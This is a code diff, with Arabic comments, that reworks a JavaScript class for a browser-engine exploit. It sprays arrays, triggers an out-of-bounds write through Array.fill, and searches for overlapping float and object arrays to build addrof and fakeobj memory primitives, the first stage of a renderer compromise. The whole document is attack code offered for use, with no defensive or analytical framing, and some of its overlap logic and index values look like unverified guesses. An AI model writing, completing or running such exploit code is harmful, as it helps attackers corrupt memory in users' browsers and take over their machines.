@@ -4,43 +4,51 @@ class AddrofFakeobjExploit {
     constructor() {
         this.float_arr = null;
         this.obj_arr = null;
-        this.OVERLAP_IDX = 8;
+        this.OVERLAP_IDX = 10; // جرب قيم مختلفة
     }
 
     async execute() {
-        // Step 1: Setup memory layout with OOB-write
-        await this.setupMemoryCorruption();
-        
-        // Step 2: Create overlapping arrays
-        await this.createOverlappingArrays();
-        
-        // Step 3: Test primitives
-        return await this.testPrimitives();
+        await this.createArraysWithOOB();
+        return await this.findCorrectOverlap();
     }
 
-    async setupMemoryCorruption() {
-        // استخدام OOB-write لتغيير طول المصفوفات
-        const spray = [];
+    async createArraysWithOOB() {
+        // إنشاء مجموعات متعددة من المصفوفات
+        const arrays = [];
         
-        for (let i = 0; i < 1000; i++) {
-            const float_arr = [13.37, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
-            const obj_arr = [{}, {}, {}, {}, {}, {}, {}];
-            spray.push({float_arr, obj_arr});
+        for (let i = 0; i < 100; i++) {
+            const noCoW = 13.37 + i; // قيم مختلفة لمنع COW
+            const float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
+            const obj_arr = [
+                {id: i, mark: 0}, 
+                {id: i, mark: 1}, 
+                {id: i, mark: 2},
+                {id: i, mark: 3},
+                {id: i, mark: 4},
+                {id: i, mark: 5},
+                {id: i, mark: 6},
+                {id: i, mark: 7},
+                {id: i, mark: 8},
+                {id: i, mark: 9}
+            ];
+            
+            arrays.push({float_arr, obj_arr, index: i});
         }
 
-        // Trigger OOB-write لتغيير طول إحدى المصفوفات
-        await this.triggerOOBForLengthCorruption();
+        // Trigger OOB-write
+        await this.triggerOOB();
+        await sleep(50);
         
-        return spray;
+        this.arrays = arrays;
     }
 
-    async triggerOOBForLengthCorruption() {
+    async triggerOOB() {
         const v0 = [];
-        for (let i = 0; i < 50000; i++) {
-            v0[i] = [13.37, 1.1, 2.2]; // مصفوفات صغيرة
+        for (let i = 0; i < 20000; i++) {
+            v0[i] = [1.1, 2.2, 3.3]; // مصفوفات صغيرة
         }
         
-        const v10 = {target: "length_corruption"};
+        const v10 = {oob: "corruption"};
         
         let shrunk = false;
         const o14 = {
@@ -56,93 +64,74 @@ class AddrofFakeobjExploit {
         v0.fill(v10, o14);
     }
 
-    async createOverlappingArrays() {
-        // منع Copy-on-Write
-        let noCoW = 13.37;
-        
-        // إنشاء المصفوفات المتداخلة
-        this.float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
-        this.obj_arr = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}, {f: 6}, {g: 7}];
-        
-        // البحث عن المصفوفات التي تغير طولها بسبب OOB-write
-        await this.findCorruptedArrays();
-    }
-
-    async findCorruptedArrays() {
-        const spray = [];
-        
-        for (let i = 0; i < 500; i++) {
-            const float_arr = [13.37, 1.1, 2.2, 3.3];
-            const obj_arr = [{x: i}, {y: i}];
-            spray.push({float_arr, obj_arr, index: i});
-        }
-
-        // 
-        await sleep(100);
-
-        for (const item of spray) {
-            if (item.float_arr.length > 10) {
-                log("Found corrupted float_arr with length: " + item.float_arr.length);
-                this.float_arr = item.float_arr;
-                this.obj_arr = item.obj_arr;
-                break;
+    async findCorrectOverlap() {
+        for (const pair of this.arrays) {
+            for (let idx = 8; idx < 20; idx++) { // جرب عدة indexes
+                const testObj = {test: 0x1337, unique: Math.random()};
+                
+                // اختبار addrof
+                pair.obj_arr[0] = testObj;
+                const addr = pair.float_arr[idx];
+                
+                if (addr !== undefined && addr !== null && 
+                    typeof addr === 'number' && addr !== 0) {
+                    
+                    // اختبار fakeobj
+                    pair.float_arr[idx] = addr;
+                    const reconstructed = pair.obj_arr[0];
+                    
+                    if (reconstructed === testObj) {
+                        log(`Found working overlap at index: ${idx}`);
+                        log(`addrof result: ${addr}`);
+                        
+                        this.float_arr = pair.float_arr;
+                        this.obj_arr = pair.obj_arr;
+                        this.OVERLAP_IDX = idx;
+                        
+                        return true;
+                    }
+                }
             }
         }
+        
+        return false;
     }
 
-    //
     addrof(obj) {
         this.obj_arr[0] = obj;
-        return this.float_arr[this.OVERLAP_IDX];
+        const result = this.float_arr[this.OVERLAP_IDX];
+        log(`addrof input: ${obj}, output: ${result}`);
+        return result;
     }
 
-    //
     fakeobj(addr) {
         this.float_arr[this.OVERLAP_IDX] = addr;
         return this.obj_arr[0];
     }
-
-    async testPrimitives() {
-        if (!this.float_arr || !this.obj_arr) {
-            return false;
-        }
-
-        // 
-        const testObj = {secret: 0x1337};
-        
-        try {
-            const addr = this.addrof(testObj);
-            log("addrof test: " + addr);
-            
-            const fake = this.fakeobj(addr);
-            log("fakeobj test: " + (fake === testObj));
-            
-            return true;
-        } catch (e) {
-            log("Primitives test failed: " + e);
-            return false;
-        }
-    }
 }
 
-// 
+// الاخخدام
 async function main() {
     const exploit = new AddrofFakeobjExploit();
     const success = await exploit.execute();
     
     if (success) {
-        log("Addrof/Fakeobj primitives ready!");
+        log("Primitives configured successfully!");
         
-        // 
-        const obj = {data: "test", value: 0x41414141};
-        const addr = exploit.addrof(obj);
-        log("Object address: " + addr);
+        // اختبار مفصل
+        const testObj = {data: "test", number: 42};
         
-        const reconstructed = exploit.fakeobj(addr);
-        log("Reconstructed object works: " + (reconstructed === obj));
+        log("Testing addrof...");
+        const addr = exploit.addrof(testObj);
+        log(`Address: ${addr} (type: ${typeof addr})`);
+        
+        log("Testing fakeobj...");
+        const fake = exploit.fakeobj(addr);
+        log(`Fake object: ${fake}`);
+        log(`Comparison: ${fake === testObj}`);
         
     } else {
-        log("Failed to create primitives");
+        log("Failed to find working overlap");
     }
 }
 
